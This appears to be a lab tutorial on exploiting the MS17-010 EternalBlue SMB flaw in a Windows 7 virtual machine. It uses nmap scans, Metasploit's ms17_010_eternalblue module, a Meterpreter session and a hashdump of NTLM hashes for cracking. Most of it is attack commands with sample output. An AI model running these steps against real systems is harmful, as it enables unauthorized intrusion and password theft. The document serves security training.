
### **Objective**

To exploit the MS17-010 (EternalBlue) SMB vulnerability in a Windows system using Metasploit and then crack the extracted password hashes.

----
### **Tools Used**
- **Kali Linux** (Attacker Machine)
- **Metasploit Framework**
- **Nmap**
- **CrackStation / John the Ripper**
---
### **Theory**
- **MS17-010** is a critical SMB vulnerability in Windows exploited by EternalBlue.
- **Metasploit** provides modules for scanning and exploiting this vulnerability.
- After successful exploitation, **NTLM hashes** can be dumped and cracked to reveal passwords.
----
### 1. Identify IP Address
```bash
ip a                    Check your IP and subnet to determine the scanning range.
```
Possible Output:
```bash
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP
    inet 192.168.150.128/24 brd 192.168.150.255 scope global eth0
```

---
### 2. Discover Live Hosts
```bash
sudo netdiscover -r 192.168.150.0/24
# Find all active hosts in the subnet.
```
Possible Output:
```bash
192.168.150.2    00:50:56:c0:00:08   VMware
192.168.150.131  00:0c:29:ab:12:cd   VMware
192.168.150.133  00:0c:29:aa:78:90   VMware
```
### 3. Scan for SMB Vulnerabilities using Nmap
#### a. General Vulnerability Scan
```bash
nmap -T4 --script=vuln 192.168.150.131
# Run all vulnerability detection scripts on the target.
```
Possible Output:
```bash
PORT    STATE SERVICE
445/tcp open  microsoft-ds
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
```
#### b. Specific MS17-010 Check
```bash
nmap --script smb-vuln-ms17-010 -p445 192.168.150.133
Check if the host is vulnerable to EternalBlue.
```
Possible Output:
```bash
PORT    STATE SERVICE
445/tcp open  microsoft-ds
Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
```
### 4. Metasploit Framework Exploitation
#### Start Metasploit
```bash
msfconsole
```

#### Search for EternalBlue Module
```bash
search eternalblue
```
Possible Output:
```bash
Matching Modules
================
   #   Name                                     Disclosure Date  Rank    Check  Description
   -   ----                                     ---------------  ----    -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue 2017-03-14       great   Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption

```

#### Use the Exploit
```bash
use exploit/windows/smb/ms17_010_eternalblue or use the id like (use 0)
```

#### Show Options
```bash
show options
```
Possible Output:
```bash
Module options (exploit/windows/smb/ms17_010_eternalblue):
   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                   yes       The target address range or CIDR identifier
   LHOST          445       yes       The local listener address
```

#### Set Target Host 
```bash
set RHOSTS 192.168.150.133
```

#### Exploit
```bash
exploit
```
Possible Output:
```bash
[*] Started reverse TCP handler on 192.168.150.128:4444
[*] Sending stage (179779 bytes) to 192.168.150.133
[*] Meterpreter session 1 opened (192.168.150.128:4444 -> 192.168.150.133:49158)
```
### 5. Post Exploitation
#### Get System Information
```bash
sysinfo
```
Possible Output:
```bash
Computer        : VICTIM-PC
OS              : Windows 7 Professional (Build 7601, Service Pack 1)
Architecture    : x64
```

#### Get User ID
```bash
getuid
```

Possible Output:
```bash
Server username: NT AUTHORITY\SYSTEM
```

#### Hash Dump
```bash
hashdump
```
Possible Output:
```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

```bash
Breakdown
- Username→ `Administrator`
- RID → `500` 
- LM Hash → `aad3b435b51404eeaad3b435b51404ee` 
    - (If it's `aad3...`, it usually means LM hashing is disabled)     
- NTLM Hash → `31d6cfe0d16ae931b73c59d7e0c089c0`
So the separated hashes are:
- LM Hash: `aad3b435b51404eeaad3b435b51404ee`
- NTLM Hash:`31d6cfe0d16ae931b73c59d7e0c089c0`
```

---
### 6. Cracking Hashes
Copy the NTLM hash and use **CrackStation**:  
https://crackstation.net
---
